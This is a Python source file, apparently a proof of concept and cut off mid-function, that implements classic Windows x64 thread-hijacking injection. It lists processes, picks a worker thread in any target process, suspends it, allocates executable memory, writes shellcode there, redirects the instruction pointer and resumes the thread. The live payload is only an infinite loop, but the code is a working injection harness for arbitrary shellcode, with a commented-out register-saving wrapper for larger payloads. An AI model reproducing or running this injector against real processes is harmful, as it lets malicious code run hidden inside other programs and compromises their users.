"""
(prod) Thread Hijacking, Classic
- hijack worker thread, to minimise impact on UI for GUI applications
- arch: x64 process/host
- target: (any process)
- payload: shellcode (default: infinite-loop)


Note
-----
As far as I can tell, this APPEARS to be working effectively

Current payload uses an infinite loop (\xeb\xfe -> jmp $)
- Using a tool like Process Explorer, thread can be seen suspended
- once resumed, thread can be seen in "Running" state with elevated CPU utilisation
- parent process (of hijacked thread) continues to operate normally


CONTEXT64 struct vs manual packing/unpacking from 1232-byte buffer
------------------------------------------------------------------
CONTEXT64 struct created and kept here for posterity
- however even simple infinite-loop payload would cause 0xc0000005 Access Violation issues 
  ie crash -> WerFault -> viewable in Application Event Logs
- even on custom un-protected (!CFG) victim.exe binary that just spawns threads

Even though debug_cpu_registers() shows registers are at expected offsets
- still issues with ctypes potential truncation of 64-bit values and padding/alignment

To skip manualy calculating offsets and padding in order to align register values:
- a 1232-byte buffer created instead
- data packed/unpacked from known offsets for Instruction and Stack pointers


Steps
-----
1. Open target process
2. Find/open a thread in target process
3. Suspend the thread
4. Allocate memory for shellcode
5. Write shellcode to allocated memory
6. Get thread's current context (registers)
7. Modify RIP to point to your shellcode
8. Set thread's context (apply changes)
9. Resume the thread → shellcode executes
"""

import ctypes
from ctypes import wintypes
from collections import defaultdict
from contextlib import contextmanager
import msvcrt
import struct


kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)


# ----------------------------------
# Payload (samples)
# ----------------------------------
payload_ret = b"\xc3"       # ret
payload_loop = b"\xeb\xfe"  # jmp -2 / jmp $ (infinite loop)

payload = payload_loop

'''
# ----- PUSH/POP, save/restore register values
# - prologue -> alignment + shadow -> payload + epilogue

# 1. prologue bytes
prologue = b"\x9c\x50\x51\x52\x53\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57"

# 2. Save non-volatile index registers consumed by LODSB/STOSB 
preserve_indices = b"\x56\x57"  # PUSH RSI, PUSH RDI

# 3. alignment & shadow space bytes
alignment = b"\x48\x89\xe5\x48\x83\xe4\xf0\x48\x83\xec\x20"

# 4. custom payload here

# 5. Restore non-volatile index registers in reverse order
restore_indices = b"\x5f\x5e"   # POP RDI, POP RSI

# 4. epilogue bytes
epilogue = b"\x48\x89\xec\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5d\x5b\x5a\x59\x58\x9d\xc3"


payload = prologue + preserve_indices + alignment + payload_calc + restore_indices + epilogue
'''


# ----------------------------------
# CONSTANTS
# ----------------------------------

# CreateToolhelp32Snapshot()
INVALID_HANDLE_VALUE        = wintypes.HANDLE(-1)
TH32CS_SNAPPROCESS          = 0x02
TH32CS_SNAPTHREAD           = 0x04

# CONTEXT64() struct
CONTEXT_ALL     = 0x10001f 
CONTEXT_CONTROL = 0x100001 

# OpenProcess()
PROCESS_ALL_ACCESS = 0x1F0FFF               # likely to fail unless run elevated/as-admin
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000  # alternative, minimal privileges required

# OpenThread()
THREAD_ALL_ACCESS           = 0x1FFFFF
THREAD_QUERY_INFORMATION    = 0x0040

# PROCESSENTRY32W() struct
MAX_PATH = 260

# VirtualAllocEx() / VirtualProtectEx () - samples
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80

# Return status used by various Nt_ and Suspend/Resume Thread()
NEG_RETURN_STATUS       = 0xFFFFFFFF

# Stack and memory alignment
STACK_SIZE      = 0x1000    # 4KB (one page)
SHADOW_SPACE    = 0x20      # 32 bytes, (standard x64 calling convention)
RET_ADDR_SIZE   = 0x08      # 8 bytes (size of a 64-bit address)
ALIGNMENT_MASK  = ~0xF      # mask for 16-byte alignment

# --------------- Mapping dictionary for common memory constants ---------------
MEM_STATE = {0x1000: "MEM_COMMIT", 0x2000: "MEM_RESERVE", 0x10000: "MEM_FREE"}
MEM_TYPE = {0x20000: "MEM_PRIVATE", 0x40000: "MEM_MAPPED", 0x1000000: "MEM_IMAGE"}
PAGE_PROTECT = {
    0x01: "PAGE_NOACCESS",
    0x02: "PAGE_READONLY",
    0x04: "PAGE_READWRITE",
    0x10: "PAGE_EXECUTE",
    0x20: "PAGE_EXECUTE_READ",
    0x40: "PAGE_EXECUTE_READWRITE"
}

# ----------------------------------
# Struct Definitions
# ----------------------------------

class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ProcessID",       wintypes.DWORD),
        ("th32DefaultHeapID",   ctypes.c_size_t),
        ("th32ModuleID",        wintypes.DWORD),
        ("cntThreads",          wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase",      wintypes.LONG),
        ("dwFlags",             wintypes.DWORD),
        ("szExeFile",           wintypes.WCHAR * MAX_PATH)
]

class THREADENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ThreadID",        wintypes.DWORD),
        ("th32OwnerProcessID",  wintypes.DWORD),
        ("tpBasePri",           wintypes.LONG),
        ("tpDeltaPri",          wintypes.LONG),
        ("dwFlags",             wintypes.DWORD),
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("PartitionId", wintypes.WORD),
        ("RegionSize", ctypes.c_size_t),        # <--- This is the size
        ("State", wintypes.DWORD),              # 0x1000 = MEM_COMMIT
        ("Protect", wintypes.DWORD),            # 0x40 = PAGE_EXECUTE_READWRITE
        ("Type", wintypes.DWORD),               # 0x20000 = MEM_PRIVATE
    ]

# for CONTEXT64 struct
class M128A(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        ("Low", ctypes.c_uint64),
        ("High", ctypes.c_int64),
    ]

# Used to store CPU register data, for a given thread
# - struct required to be of specific length/size
# - and registers at specific offsets
# - otherwise, padding required to ensure fields exist on 16-byte boundaries
#
# Function to confirm above, created for this reason
# - debug_cpu_registers()
class CONTEXT64(ctypes.Structure):
    """Complete Windows x64 CONTEXT structure - 1232 bytes total"""
    _pack_ = 16
    _fields_ = [
        # Register parameter home addresses (48 bytes)
        ("P1Home", ctypes.c_uint64),
        ("P2Home", ctypes.c_uint64),
        ("P3Home", ctypes.c_uint64),
        ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64),
        ("P6Home", ctypes.c_uint64),
        
        # Control flags (8 bytes)
        ("ContextFlags", wintypes.DWORD),
        ("MxCsr", wintypes.DWORD),
        
        # Segment registers (16 bytes)
        ("SegCs", wintypes.WORD),
        ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD),
        ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD),
        ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        
        # Debug registers (48 bytes)
        ("Dr0", ctypes.c_uint64),
        ("Dr1", ctypes.c_uint64),
        ("Dr2", ctypes.c_uint64),
        ("Dr3", ctypes.c_uint64),
        ("Dr6", ctypes.c_uint64),
        ("Dr7", ctypes.c_uint64),
        
        # Integer registers (128 bytes - 16 registers * 8 bytes)
        ("Rax", ctypes.c_uint64),
        ("Rcx", ctypes.c_uint64),
        ("Rdx", ctypes.c_uint64),
        ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64),
        ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64),
        ("Rdi", ctypes.c_uint64),
        ("R8", ctypes.c_uint64),
        ("R9", ctypes.c_uint64),
        ("R10", ctypes.c_uint64),
        ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64),
        ("R13", ctypes.c_uint64),
        ("R14", ctypes.c_uint64),
        ("R15", ctypes.c_uint64),
        
        # Instruction pointer (8 bytes)
        ("Rip", ctypes.c_uint64),
        
        # Floating point save area (512 bytes)
        ("FltSave", M128A * 32),
        
        # Vector registers (416 bytes - 26 * 16 bytes)
        ("VectorRegister", M128A * 26),
        ("VectorControl", ctypes.c_uint64),
        
        # Debug control (40 bytes)
        ("DebugControl", ctypes.c_uint64),
        ("LastBranchToRip", ctypes.c_uint64),
        ("LastBranchFromRip", ctypes.c_uint64),
        ("LastExceptionToRip", ctypes.c_uint64),
        ("LastExceptionFromRip", ctypes.c_uint64),
    ]



# ----------------------------------
# Function Prototypes
# ----------------------------------

# --------------- kernel32.dll ---------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.CreateToolhelp32Snapshot.argtypes=[
    wintypes.DWORD,     # dwFlags
    wintypes.DWORD,     # th32ProcessID
]
kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE

kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,            # hThread
    ctypes.c_void_p,            # *lpContext
]
kernel32.GetThreadContext.restype = wintypes.BOOL

kernel32.GetThreadId.argtypes = [ wintypes.HANDLE, ]
kernel32.GetThreadId.restype = wintypes.DWORD

kernel32.GetThreadTimes.argtypes = [
    wintypes.HANDLE,                    # hThread
    ctypes.POINTER(wintypes.FILETIME),  # lpCreationtime
    ctypes.POINTER(wintypes.FILETIME),  # lpExitTime
    ctypes.POINTER(wintypes.FILETIME),  # lpKernelTime
    ctypes.POINTER(wintypes.FILETIME),  # lpUserTime
]    
kernel32.GetThreadTimes.restype = wintypes.BOOL

kernel32.OpenProcess.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwProcessId
]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.OpenThread.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwThreadId
]
kernel32.OpenThread.restype = wintypes.HANDLE

kernel32.Process32FirstW.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(PROCESSENTRY32W),    # [o] lppe, proc-list entry from snapshot
]
kernel32.Process32FirstW.restype = wintypes.BOOL

kernel32.Process32NextW.argtypes=[
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(PROCESSENTRY32W),    # [o] lppe, proc-list entry from snapshot
]
kernel32.Process32NextW.restype = wintypes.BOOL

kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL

kernel32.ResumeThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.ResumeThread.restype = wintypes.DWORD


kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,            # hThread
    ctypes.c_void_p,            # *lpContext
]
kernel32.SetThreadContext.restype = wintypes.BOOL


kernel32.SuspendThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.SuspendThread.restype = wintypes.DWORD

kernel32.Thread32First.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(THREADENTRY32),      # lpte
]
kernel32.Thread32First.restype = wintypes.BOOL

kernel32.Thread32Next.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(THREADENTRY32),      # lpte
]
kernel32.Thread32Next.restype = wintypes.BOOL

kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p

kernel32.VirtualQueryEx.argtypes = [
    wintypes.HANDLE,                            # hProcess
    wintypes.LPCVOID,                           # lpAddress (opt) 
    ctypes.POINTER(MEMORY_BASIC_INFORMATION),   # [o] lpBuffer
    ctypes.c_size_t,                            # dwLength
]
kernel32.VirtualQueryEx.restype = ctypes.c_size_t

kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL




# ----------------------------------
# Function Definitions
# ----------------------------------


# --------------- Misc helper functions ---------------
def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to prevent resource leaks """

    if name == "Snapshot":
        print(f"\n[+] Closing Handle to {name}: ", end='')
    else:
        print(f"    -> Closing Handle to {name}: ", end='')
    
    if handle is None or handle.value == 0:
        raise ValueError(f"[!] Warning: {name} is None or invalid, nothing to close")

    if not kernel32.CloseHandle(handle):
        print(f"[!] Failed! {name} handle: {handle}, Error: {winerr()}")
    else:
        print(f"Success ({handle.value})")


def key_sort(name: str) -> str:
    """ Ensure processes sorted alphabetically, regardless of case """
    return name.casefold()


def pause() -> None:
    """ Pause until user key press (any) """
    msg = "\nPress any key to continue..."
    print(msg, end='', flush=True)
    msvcrt.getch()
    print()


def print_hdr(hdr: str) -> None:
    border = "-" * len(hdr.strip())
    print(f"\n{border}{hdr}{border}")


def debug_cpu_registers() -> None:
    """
    CONTEXT64() struct used to hold a snapshot of a thread's processor state
    - here we debug to confirm proper struct size and register offsets
    - if numbers do NOT match expectations, then padding in STRUCT def are REQUIRED
    - this addresses 0xc000000005 Access Violation errors when calling ResumeThread()
    """
    
    print(f"\n[+] DEBUG: CONTEXT64() struct and CPU register offset info:")
    print(f"    -> Struct size: {ctypes.sizeof(CONTEXT64)} (Expected: 1232)")
    print(f"    -> Dr0 Offset: {CONTEXT64.Dr0.offset} (Expected: 80 or 96)")
    print(f"    -> Rax Offset: {CONTEXT64.Rax.offset} (Expected: 128 or 144)")
    print(f"    -> Rsp Offset: {CONTEXT64.Rsp.offset} (Expected: 152)")
    print(f"    -> Rip Offset: {CONTEXT64.Rip.offset} (Expected: 248)")


# --------------- Process Id information ---------------


def group_pids_by_process() -> tuple[
            defaultdict[str, list[int]],
            dict[int, str]
]:
    """
    Snapshot taken of running processes -> TH32CS_SNAPPROCESS
    - iterated by Process32FirstW -> Process32NextW, until empty

    Returns a numer of dictionaries later used for different purposes
    [+] proc_groups: 
    - defaultdict() of process names, and list of associated PIDs
    - for iteration of full-print out 

    [+] pid_to_proc_map: O(1)
    - PID validation, 1:1 of PID to process name
    """

    # proc_groups -> for iterating whole list in full print-out
    proc_groups: defaultdict[str, list[int]] = defaultdict(list)

    # pid_proc_map -> fast search for later-on PID validation
    pid_to_proc_map: dict[int, str] = {}

    pe32w = PROCESSENTRY32W()
    pe32w.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    # Context Manager - snapshot
    with snapshot(TH32CS_SNAPPROCESS) as hSnapshot: 
        if not kernel32.Process32FirstW(hSnapshot, ctypes.byref(pe32w)):
            raise winerr()

        print("    -> Taking Snapshot: Running Processes... ", end='', flush=True)

        while True:
            name = pe32w.szExeFile      # process name
            pid  = pe32w.th32ProcessID  # leave PIDs as ints in list

            proc_groups[name].append(pid)
            pid_to_proc_map[pid] = name
                
            if not kernel32.Process32NextW(hSnapshot, ctypes.byref(pe32w)):
                break

        print("Completed")

    return proc_groups, pid_to_proc_map




def print_pids_by_process(process_groups: dict[str, list[int]]) -> None:
    """
    Print Process Names -> associated PIDs -> count of PIDs
    - sorted alphabetically, then numerically
    - PID list truncated if too long (eg svchost.exe)
    """

    # header info
    print(f"\n{'Process Name':<40} {'PID':<40} {'Count':>5}")
    print('-' * 87)


    for process_name in sorted(process_groups.keys(), key=key_sort):
        sorted_pids = sorted(process_groups[process_name])
        
        # join pids -> must first be converted to type str()
        pid_list_str = ', '.join(str(pid) for pid in sorted_pids)
        
        count = len(sorted_pids)
        
        # truncate long list of PIDs
        if len(pid_list_str) > 35:
            pid_list_str = pid_list_str[:35] + '...'
        
        print(f"{process_name:<40} {pid_list_str:<40} {count:<5}")




def request_pid(pid_map: dict[int, str]) -> int:
    """ Return positive integer -> later validate if actual PID """
    while True:
        try:
            pid = int(input("\nPlease enter a valid PID: "))
            if pid > 0:
                if validate_pid(pid, pid_map):
                    return pid
            else:
                print("[!] Please enter a positive integer: ")
        except ValueError as e:
            print(f"\n[!] Invalid Input, Error: {e}")




def validate_pid(pid: int, pid_map: dict[int, str]) -> bool:
    """ Checks if PID exists in previous 'fast-search' dict map """
    
    process_name = pid_map.get(pid)

    if process_name:
        print(f"    -> PID found: {pid} Process: {process_name}")
        return True
    else:
        print(f"[!] Error: PID {pid} not found in snapshot")
        return False


# --------------- Thread Id information ---------------


def get_single_worker_thread(pid: int) -> tuple[wintypes.HANDLE, int]:
    """
    Return hThread and dwThreadId for a single, worker thread (not main)
    - requires iterating all Threads for a Pid
    - then sorting by creation timestamp, selecting any from non-oldest
    """
    
    thread_data = [] # list of tuples, (timestamp, tid)
    
    te32 = THREADENTRY32()
    te32.dwSize = ctypes.sizeof(THREADENTRY32)


    # iterate through system snapshot of active threads
    with snapshot(TH32CS_SNAPTHREAD) as hSnapshot:    
        if not kernel32.Thread32First(hSnapshot, ctypes.byref(te32)):
            raise winerr()
            
        print("    -> Taking Snapshot: Active Threads... ", end='', flush=True)
        
        while True:
            if te32.th32OwnerProcessID == pid:
                tid = te32.th32ThreadID

                # temporary handle
                hThread = kernel32.OpenThread(
                    THREAD_QUERY_INFORMATION,
                    False,
                    tid)

                # Windows stores time in the FILETIME() struct
                # - initialise four, to recieve creation, exit, kernel and user times
                if hThread:
                    ct = wintypes.FILETIME()
                    et = wintypes.FILETIME()
                    kt = wintypes.FILETIME()
                    ut = wintypes.FILETIME()
                    
                    # get creation times
                    if kernel32.GetThreadTimes(hThread,
                        ctypes.byref(ct),
                        ctypes.byref(et),
                        ctypes.byref(kt),
                        ctypes.byref(ut)
                    ):
                        # combine both 32-bit fields into one 64-bit timestamp
                        ts = (ct.dwHighDateTime << 32) + ct.dwLowDateTime
                        thread_data.append((ts, tid))

                kernel32.CloseHandle(hThread)

            if not kernel32.Thread32Next(hSnapshot, ctypes.byref(te32)):
                break
 
        print("Completed")
 
        print(f"\n[+] Finding Worker Thread Id: OpenThread()")
        if len(thread_data) < 2:
            print(f"\n[!] No worker threads found (process only has a single main thread [!]")
            return None


        # sort by timestamp (age), where index 0 is oldest (main thread)
        thread_data.sort()

        print(f"    -> Number of Threads: {len(thread_data)}")
        for ts,tid in thread_data:
            print(f"        + ThreadId: {tid}, Timestamp: {ts}")
        
        # select any non-main thread (here, we choose second oldest, main being the oldest)
        worker_tid = thread_data[1][1]
        
        hWorker = kernel32.OpenThread(THREAD_ALL_ACCESS, False, worker_tid)
        if not hWorker:
            print(f"[!] Failed to open Worker Thread Id: {worker_tid}")
            return None


        print(f"    -> Success, Worker Thread found: ({worker_tid})")
        return wintypes.HANDLE(hWorker), worker_tid



def suspend_thread(hThread: wintypes.HANDLE, dwThreadId: int) -> None:
    """ SuspendThread() returns 'current' count, then increments """
    
    print(f"\n[+] Suspending Worker Thread: ", end='')
    
    suspend_count = kernel32.SuspendThread(hThread)
    if suspend_count == NEG_RETURN_STATUS:
        raise winerr()
    
    print("Success")
    print(f"    -> ThreadId: {dwThreadId}")
    print(f"    -> Handle:   {hThread.value}")
    print(f"    -> Previous suspend count: {suspend_count}")
    print(f"    -> Current suspend count:  {suspend_count + 1}")
    


def resume_thread(hThread: wintypes.HANDLE, dwThreadId: int) -> None:
    """ ResumeThread() returns 'current' count, then decrements """
    
    print(f"\n[+] Resuming Worker Thread: ", end='')
    
    suspend_count = kernel32.ResumeThread(hThread)
    if suspend_count == NEG_RETURN_STATUS:
        raise winerr()
    
    print("Success")
    print(f"    -> ThreadId: {dwThreadId}")
    print(f"    -> Handle:   {hThread.value}")
    print(f"    -> Previous suspend count: {suspend_count}")
    print(f"    -> Current suspend count:  {suspend_count - 1}")


# --------------- Memory Manipulation ---------------


def allocate_memory(
    hProcess: wintypes.HANDLE,
    dwSize: ctypes.c_size_t
) -> wintypes.LPVOID:

    """
    Allocate memory in suspended process
    - returns: ptr to memory, in REMOTE process
    """

    print(f"\n[+] Allocating memory: ", end='')
    lpAddress = ctypes.c_void_p(0)
    ptr = kernel32.VirtualAllocEx(
            hProcess,
            lpAddress,
            dwSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE) # red flag but fine for PoC

    if not ptr:
        raise winerr()
    
    
    print("Success")
    print(f"    -> Base Address: {hex(ptr)}")
    return ptr




def allocate_memory_verification(hProcess: wintypes.HANDLE, lpAddress: int) -> None:
    """ Query MBI to verify memory has been allocated """
 
    mbi = MEMORY_BASIC_INFORMATION()
    
    
    print(f"\n[+] Verifying memory allocation: ", end='')
    if not kernel32.VirtualQueryEx(hProcess, lpAddress, ctypes.byref(mbi), ctypes.sizeof(mbi)):
        raise winerr()


    # ----- Fields/Formatting to make output look pretty -----
    match_addr = True if mbi.BaseAddress == lpAddress else False

    # use .get() to return hex, if constant isn't in the dictionary (CONSTANTS -> Mapped)
    state_str = MEM_STATE.get(mbi.State, hex(mbi.State))
    protect_str = PAGE_PROTECT.get(mbi.Protect, hex(mbi.Protect))
    type_str = MEM_TYPE.get(mbi.Type, hex(mbi.Type))

    V = 16

    print("Success")
    print(f"    -> Base Address:   {hex(mbi.BaseAddress):<{V}} (Match above: {match_addr})")
    print(f"    -> Region Size:    {hex(mbi.RegionSize):<{V}} ({mbi.RegionSize} Bytes)")
    print(f"    -> State:          {hex(mbi.State):<{V}} ({state_str})")
    print(f"    -> Protect:        {hex(mbi.Protect):<{V}} ({protect_str})")
    print(f"    -> Type:           {hex(mbi.Type):<{V}} ({type_str})")


# --------------- Write -------------------------


def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
) -> None:

    """ Writes raw payload bytes directly into the target process memory """

    print(f"\n[+] Writing payload: ", end='')

    n_written = ctypes.c_size_t(0)

    if not kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,     # target/base address
        payload,           # raw byte string (e.g., b"\xfc\x48...")
        len(payload),      # size of payload
        ctypes.byref(n_written)
    ):
        raise winerr()

    print("Success")
    print(f"    -> Destination Address: {hex(lpBaseAddress)}")
    print(f"    -> Payload Size: {len(payload)} bytes")
    print(f"    -> Bytes written: {n_written.value}")



def write_payload_verification(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
    ):
    
    """ Verify that the memory written, matches the payload """
    
    read_buffer = ctypes.create_string_buffer(len(payload))
    num_bytes_read = ctypes.c_size_t(0)

    print(f"\n[+] Verifying written payload: ", end='')

    if not kernel32.ReadProcessMemory(
        hProcess,
        lpBaseAddress,
        read_buffer,
        len(payload),
        ctypes.byref(num_bytes_read)
    ):
        raise winerr()
        
    if payload != read_buffer.raw:
        raise ValueError(f"[!] Integrity checked failed: Content mismatch at {hex(lpBaseAddress)}")

    print("Success")
    print(f"    -> Integrity check confirmed")


# --------------- Get Thread Context -------------------------

def verify_rip_bytes(old_rip: int):
    # Convert to 8 bytes, little-endian
    old_rip_bytes = old_rip.to_bytes(8, 'little')
    
    # Format for easy reading
    hex_bytes = ' '.join(f'{b:02x}' for b in old_rip_bytes)
    
    print(f"\n[+] Verifying original RIP before write:")
    print(f"    -> Integer:       {old_rip}")
    print(f"    -> Hexadecimal:   {hex(old_rip)}")
    print(f"    -> Byte Pattern:  {hex_bytes} (Little-endian)")



'''
# This function uses the CONTEXT64 struct -> ctx = CONTEXT64()
# - registers referenced via ctx.Rip, ctx.Rsp

def get_current_registers_context(
    hProcess: wintypes.HANDLE,
    hThread: wintypes.HANDLE,
    lpBaseAddress: int
) -> None:

    """
    Retrieve CPU-register info for target hThread
    - Get -> Modify -> Set all at once
    
    Modify:
    - redirect Rip to point to shellcode
    - manual 'push' of Rsp onto new stack
    
    Note: Rsp to new stack
    - when shellcode finishes, and executes final RET (\xc3), CPU looks at Rsp
    - Rsp points to new stack, where 'old_rip' is written
    - 'old_rip' is POP'd into the Instruction Pointer -> notepad resumes
    """
    
    # align struct to 16-byte memory boundary
    raw_buffer = ctypes.create_string_buffer(ctypes.sizeof(CONTEXT64) + 16)
    raw_addr = ctypes.addressof(raw_buffer)
    aligned_addr = (raw_addr + 0xF) & ALIGNMENT_MASK 
    
    ctx = CONTEXT64.from_address(aligned_addr)
    
    # request all registers
    ctx.ContextFlags = CONTEXT_ALL # 0x10001f

    # ---------- GET: current thread context ----------
    # - populates struct with register info   
    print(f"\n[+] Reading current state of CPU-registers for thread:")
    if not kernel32.GetThreadContext(hThread, ctypes.byref(ctx)):
        raise winerr()

    print(f"    -> RIP (Instruction Pointer):  {hex(ctx.Rip)}")
    print(f"    -> RAX (Accumulator Register): {hex(ctx.Rax)}") 
    print(f"    -> RSP (Stack Pointer):        {hex(ctx.Rsp)}") 


    # ---------- Modify: register pointers ----------

    # INSTRUCTION POINTER
    verify_rip_bytes(ctx.Rip)

    old_rip = ctx.Rip
    ctx.Rip = ctypes.c_uint64(lpBaseAddress).value # IP -> shellcode address



    # STACK POINTER - allocate space
    print(f"\n[+] Allocating memory for new stack:")
    new_stack_base = kernel32.VirtualAllocEx(
        hProcess, 
        None,                       # lpAddress
        STACK_SIZE,                 # dwSize
        MEM_COMMIT | MEM_RESERVE,   # flAllocationType
        PAGE_READWRITE
    )
    
    if not new_stack_base:
        raise winerr()
    print(f"    -> Success, new_stack: {hex(new_stack_base)}")

    # calculate new RSP on new stack (8 == return address length)
    new_rsp = (new_stack_base + STACK_SIZE  - SHADOW_SPACE - RET_ADDR_SIZE) & ALIGNMENT_MASK

    breakpoint()

    ctx.Rsp = ctypes.c_uint64(new_rsp).value

    # Manual 'push' of old_rip -> new stack, so 'ret' works later'
    # - the 'old_rip' is effectively written to the top of the new stack (RET_ADDR_SIZE)
    # - shadow space is wiggle room for shellcode functions to use
    # - actual Rsp is now further down, from the top of the stack 
    print(f"\n[+] Writing original RiP, to new Rsp on new stack: ")

    old_rip_bytes = old_rip.to_bytes(8, 'little')
    n_written = ctypes.c_size_t(0)

    if not kernel32.WriteProcessMemory(
        hProcess,
        new_rsp,                # lpBaseAddress
        old_rip_bytes,          # lpBuffer
        RET_ADDR_SIZE ,         # nSize
        ctypes.byref(n_written)
    ):
        raise winerr()
    
    print(f"    -> Success, bytes written: {n_written.value}")


    print(f"[!] DEBUG: Checking length of values")
    print(f"    -> ctx.Rip:         {ctx.Rip.bit_length()}")
    print(f"    -> lpBaseAddress:   {lpBaseAddress.bit_length()}")
    print(f"    -> ctx.Rsp:         {ctx.Rsp}")


    # ---------- SET: apply changes ----------
    print(f"\n[+] Applying changes -> SetThreadContext(): ", end='')
    if not kernel32.SetThreadContext(hThread, ctypes.byref(ctx)):
        raise winerr()
    print("Success")
'''



def get_current_registers_context(
    hProcess: wintypes.HANDLE,
    hThread: wintypes.HANDLE,
    lpBaseAddress: int
) -> None:
    """
    Retrieve and modify CPU-register info using a raw byte buffer.
    
    Bypasses ctypes.Structure padding bugs by using static x64 offsets:
      - ContextFlags: Offset 48 (0x30)
      - RSP (Stack Pointer): Offset 152 (0x98)
      - RIP (Instruction Pointer): Offset 248 (0xF8)
      
    - GET -> MODIFY -> SET register values all at once
    """
    
    # create 1232-byte buffer -> representing full size of CONTEXT64() struct
    # - add 16 bytes for manual boundary alignment
    raw_buffer = ctypes.create_string_buffer(1232 + 16)
    raw_addr = ctypes.addressof(raw_buffer)
    aligned_addr = (raw_addr + 0xF) & ALIGNMENT_MASK 
    
    # create a pointer to the aligned address
    aligned_buffer = (ctypes.c_char * 1232).from_address(aligned_addr)
    
    # set ContextFlags (CONTEXT_ALL = 0x10001f) at offset 48 (4 bytes)
    # - get all register information
    struct.pack_into("<I", aligned_buffer, 48, 0x10001f)


    # ---------- GET: current thread context ----------
    
    # populate buffer -> unpack at specific offsets/lenghts for known registers
    print(f"\n[+] Reading current state of CPU-registers for thread: ", end='')
    if not kernel32.GetThreadContext(hThread, aligned_buffer):
        raise winerr()
    print("Success")

    # '<Q' - 8 bytes, little-endian
    original_rsp = struct.unpack_from("<Q", aligned_buffer, 152)[0]
    original_rip = struct.unpack_from("<Q", aligned_buffer, 248)[0]

    print(f"    -> Original RIP: {hex(original_rip)}")
    print(f"    -> Original RSP: {hex(original_rsp)}") 


    # ---------- Modify: register pointers ----------

    # STACK POINTER - allocate space
    print(f"\n[+] Allocating memory for new stack:")
    new_stack_base = kernel32.VirtualAllocEx(
        hProcess, 
        None,                       # lpAddress
        STACK_SIZE,                 # dwSize
        MEM_COMMIT | MEM_RESERVE,   # flAllocationType
        PAGE_READWRITE
    )
    
    if not new_stack_base:
        raise winerr()
    print(f"    -> Success, new_stack: {hex(new_stack_base)}")

    # Calculate new RSP on new stack (ensuring 16-byte alignment)
    new_rsp = (new_stack_base + STACK_SIZE - SHADOW_SPACE - RET_ADDR_SIZE) & ALIGNMENT_MASK
    
    # manual 'push' of original_rip onto the top of the new stack
